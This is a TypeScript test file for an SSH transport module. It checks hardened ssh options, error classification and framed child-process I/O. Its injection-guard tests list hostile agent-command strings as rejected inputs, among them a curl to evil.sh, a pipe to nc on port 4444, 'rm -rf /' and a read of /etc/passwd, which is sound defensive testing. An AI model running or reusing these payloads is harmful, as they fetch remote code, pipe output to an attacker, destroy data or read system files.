/**
 * SSH transport tests (issue #112, plan unit U7).
 *
 * buildSshCommand pure cases, spawnSshTransport round-trips against a fixture
 * bridge child (injected commandFactory — no real ssh), lifecycle/close, the
 * stderr ring buffer, framing fail-closed, and parseSshExit classification.
 */
import { spawn } from 'node:child_process';
import { describe, expect, it } from 'vitest';
import {
  MachineAgentCommandError,
  REMOTE_DAEMON_SOCKET_PATH,
  buildSshCommand,
  parseSshExit,
  spawnSshTransport,
  splitAgentCommand,
  type SshCommandFactory,
} from '../../src/main/machines/ssh-transport';
import type { LocalMachineRecord, RemoteMachineRecord } from '../../src/shared/types/machine';

const FIXTURE_ECHO = new URL('../fixtures/machines/echo-bridge.cjs', import.meta.url).pathname;

const T0 = '2026-08-23T00:00:00.000Z';

function sshMachine(overrides: Partial<RemoteMachineRecord> = {}): RemoteMachineRecord {
  return {
    id: 'build-1',
    label: 'Build server',
    kind: 'ssh',
    host: 'build.example.com',
    port: 22,
    user: '',
    agentCommand: 'orchid-agent',
    created_at: T0,
    updated_at: T0,
    ...overrides,
  };
}

const localMachine: LocalMachineRecord = { id: 'local', label: 'This PC', kind: 'local' };

async function waitFor(condition: () => boolean, timeoutMs = 5000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!condition()) {
    if (Date.now() > deadline) throw new Error('waitFor condition not met in time');
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
}

function spawnFixture(
  mode: string,
  modeArg?: string,
): ReturnType<typeof spawnSshTransport> {
  return spawnSshTransport(sshMachine(), {
    spawnFn: spawn,
    commandFactory: ((_machine, _knownHostsPath) =>
      modeArg === undefined
        ? [process.execPath, FIXTURE_ECHO, mode]
        : [process.execPath, FIXTURE_ECHO, mode, modeArg]) as SshCommandFactory,
  });
}

// ── buildSshCommand ──────────────────────────────────────────────────────────

describe('buildSshCommand', () => {
  it('builds the default argv with all ssh hardening options', () => {
    expect(buildSshCommand(sshMachine(), '/home/u/.orchid/machines/build-1/known_hosts')).toEqual([
      'ssh',
      '-o',
      'BatchMode=yes',
      '-o',
      'StrictHostKeyChecking=yes',
      '-o',
      'UserKnownHostsFile=/home/u/.orchid/machines/build-1/known_hosts',
      // The per-machine pin file is the only trust source.
      '-o',
      'GlobalKnownHostsFile=none',
      '-o',
      'ConnectTimeout=10',
      // Half-open connection detection (NAT-dropped bridges must not hang).
      '-o',
      'ServerAliveInterval=15',
      '-o',
      'ServerAliveCountMax=3',
      'build.example.com',
      '--',
      'orchid-agent',
      'bridge',
      REMOTE_DAEMON_SOCKET_PATH,
    ]);
    expect(REMOTE_DAEMON_SOCKET_PATH).toBe('~/.orchid/daemon.sock');
  });

  it('adds the port flag and user prefix for non-default values', () => {
    const argv = buildSshCommand(
      sshMachine({ port: 2222, user: 'deploy' }),
      '/kh',
    );
    expect(argv).toContainEqual('-p');
    expect(argv[argv.indexOf('-p') + 1]).toBe('2222');
    expect(argv).toContain('deploy@build.example.com');
    expect(argv).not.toContain('build.example.com');
  });

  it('shell-splits a multi-token agentCommand and appends bridge + socket path last', () => {
    const argv = buildSshCommand(
      sshMachine({ agentCommand: '~/.local/bin/orchid-agent --verbose' }),
      '/kh',
    );
    expect(argv.slice(-4)).toEqual([
      '~/.local/bin/orchid-agent',
      '--verbose',
      'bridge',
      REMOTE_DAEMON_SOCKET_PATH,
    ]);
  });

  it('rejects the implicit local machine and an empty agent command', () => {
    expect(() => buildSshCommand(localMachine, '/kh')).toThrow(/not an SSH remote/);
    expect(() => buildSshCommand(sshMachine({ agentCommand: '   ' }), '/kh')).toThrow(
      /produced no shell tokens/,
    );
  });
});

// ── splitAgentCommand (injection guard) ──────────────────────────────────────

describe('splitAgentCommand metacharacter guard', () => {
  /**
   * ssh re-joins everything after `--` with spaces and hands it to the remote
   * login shell, so none of these may survive parsing as plain tokens.
   */
  const injections: Array<[string, RegExp]> = [
    // Backticks survive shell-quote as plain tokens — the original bug.
    ['orchid-agent `id`', /`/],
    ['x`id`z', /`/],
    // Command substitution parses into a `$` token plus paren operators.
    ['orchid-agent $(id)', /\$/],
    ['orchid-agent $(curl http://evil.sh)', /unknown|\$/],
    // Quoting cannot smuggle spaces (or semicolons) past the guard.
    ["orchid-agent 'foo bar'", / /],
    ['orchid-agent "foo bar"', / /],
    ["orchid-agent 'x; rm -rf /'", /;/],
    // Operator sequences are shell syntax, never literal tokens.
    ['orchid-agent; rm -rf /', /;/],
    ['orchid-agent | nc attacker 4444', /\|/],
    ['orchid-agent > /tmp/pwned', />/],
    ['orchid-agent < /etc/passwd', /</],
    ['orchid-agent & spinner', /&/],
    ['orchid-agent && other', /&/],
    ['orchid-agent || other', /\|/],
    ['orchid-agent (subshell)', /\(/],
    // Backslash escapes turn into literal whitespace/metachars in the token.
    ['orchid-agent \\; -x', /;/],
    // Glob wildcards parse as operator nodes.
    ['orchid-agent *', /\*/],
    // Shell comments are syntax nodes, not tokens.
    ['orchid-agent # injected comment', /#/],
  ];

  for (const [command, invalidChar] of injections) {
    it(`rejects ${JSON.stringify(command)} with a typed error naming the metacharacter`, () => {
      const rejection = splitAgentCommandSafe(command);
      expect(rejection).toBeInstanceOf(MachineAgentCommandError);
      expect(rejection?.name).toBe('MachineAgentCommandError');
      expect(rejection?.message).toContain('agentCommand');
      expect(rejection?.message).toMatch(invalidChar);
    });
  }

  it('accepts plain single- and multi-token commands', () => {
    expect(splitAgentCommand('orchid-agent')).toEqual(['orchid-agent']);
    expect(splitAgentCommand('orchid-agent --foo bar')).toEqual(['orchid-agent', '--foo', 'bar']);
    expect(splitAgentCommand('~/.local/bin/orchid-agent --verbose')).toEqual([
      '~/.local/bin/orchid-agent',
      '--verbose',
    ]);
    expect(splitAgentCommand('/usr/local/bin/orchid-agent')).toEqual(['/usr/local/bin/orchid-agent']);
  });
});

/** Capture a typed rejection without letting it escape the assertion helper. */
function splitAgentCommandSafe(command: string): MachineAgentCommandError | undefined {
  try {
    splitAgentCommand(command);
    return undefined;
  } catch (error) {
    return error instanceof MachineAgentCommandError ? error : undefined;
  }
}

// ── parseSshExit ─────────────────────────────────────────────────────────────

describe('parseSshExit', () => {
  it('classifies a host key mismatch', () => {
    const result = parseSshExit(
      255,
      '@@@@@@@@\nWARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!\nHost key verification failed.',
    );
    expect(result.kind).toBe('host-key-mismatch');
    expect(result.hint.length).toBeGreaterThan(0);
  });

  it('classifies key/agent auth failure', () => {
    const result = parseSshExit(255, 'deploy@build.example.com: Permission denied (publickey).');
    expect(result.kind).toBe('auth-failed');
    expect(result.message).toMatch(/key\/agent authentication/i);
  });

  it('classifies unreachable hosts (timeout and refused)', () => {
    expect(
      parseSshExit(255, 'ssh: connect to host build.example.com port 22: Connection timed out').kind,
    ).toBe('unreachable');
    expect(
      parseSshExit(255, 'ssh: connect to host build.example.com port 22: Connection refused').kind,
    ).toBe('unreachable');
    expect(
      parseSshExit(255, 'ssh: Could not resolve hostname build.example.com: Name or service not known')
        .kind,
    ).toBe('unreachable');
  });

  it('classifies a missing remote bridge command (text and exit 127)', () => {
    expect(
      parseSshExit(127, 'bash: line 1: orchid-agent: command not found').kind,
    ).toBe('agent-missing');
    expect(parseSshExit(127, '').kind).toBe('agent-missing');
  });

  it('falls back to unknown with the stderr tail as the hint', () => {
    const result = parseSshExit(1, 'something entirely unexpected happened');
    expect(result.kind).toBe('unknown');
    expect(result.message).toContain('code 1');
    expect(result.hint).toContain('something entirely unexpected');
    expect(parseSshExit(null, '').kind).toBe('unknown');
  });
});

// ── spawnSshTransport ────────────────────────────────────────────────────────

describe('spawnSshTransport', () => {
  it('round-trips frames through a fixture bridge, appending missing newlines', async () => {
    const transport = spawnFixture('echo');
    const received: string[] = [];
    transport.onData((line) => received.push(line));
    transport.write(JSON.stringify({ id: 1, method: 'ping' }));

    await waitFor(() => received.length > 0);
    expect(received).toHaveLength(1);
    expect(JSON.parse(received[0] as string)).toEqual({ echoed: { id: 1, method: 'ping' } });
    transport.close();
  });

  it('re-emits a frame split across stdout chunks as one frame', async () => {
    const transport = spawnFixture('chunked');
    const received: string[] = [];
    transport.onData((line) => received.push(line));
    transport.write(JSON.stringify({ id: 'a', method: 'm', params: { deep: { value: 42 } } }));

    await waitFor(() => received.length > 0);
    expect(received).toHaveLength(1);
    expect(JSON.parse(received[0] as string)).toEqual({
      echoed: { id: 'a', method: 'm', params: { deep: { value: 42 } } },
    });
    transport.close();
  });

  it('close() kills the child and fires onClose with a null code', async () => {
    const transport = spawnFixture('echo');
    let closeCode: number | null | undefined;
    transport.onClose((code) => {
      closeCode = code;
    });
    transport.write(JSON.stringify({ id: 1, method: 'ping' }));
    transport.close();
    await waitFor(() => closeCode !== undefined);
    expect(closeCode).toBeNull();
    // onClose after the fact replays the terminal code for late subscribers.
    let lateCode: number | null | undefined;
    transport.onClose((code) => {
      lateCode = code;
    });
    expect(lateCode).toBeNull();
  });

  it('buffers only the last 50 stderr lines', async () => {
    const transport = spawnFixture('stderr-burst', '80');
    await waitFor(() => transport.recentStderr().length === 50);
    const lines = transport.recentStderr();
    expect(lines).toHaveLength(50);
    expect(lines[0]).toBe('stderr line 30');
    expect(lines[49]).toBe('stderr line 79');
    transport.close();
  });

  it('fails closed by killing the child when a frame exceeds maxFrameBytes', async () => {
    const transport = spawnSshTransport(sshMachine(), {
      spawnFn: spawn,
      commandFactory: () => [process.execPath, FIXTURE_ECHO, 'echo'],
      maxFrameBytes: 16,
    });
    let closeCode: number | null | undefined;
    transport.onClose((code) => {
      closeCode = code;
    });
    transport.write(JSON.stringify({ id: 1, method: 'this-frame-exceeds-sixteen-bytes' }));

    await waitFor(() => closeCode !== undefined);
    expect(closeCode).toBeNull();
    expect(transport.recentStderr().some((line) => line.startsWith('[framing]'))).toBe(true);
  });
});
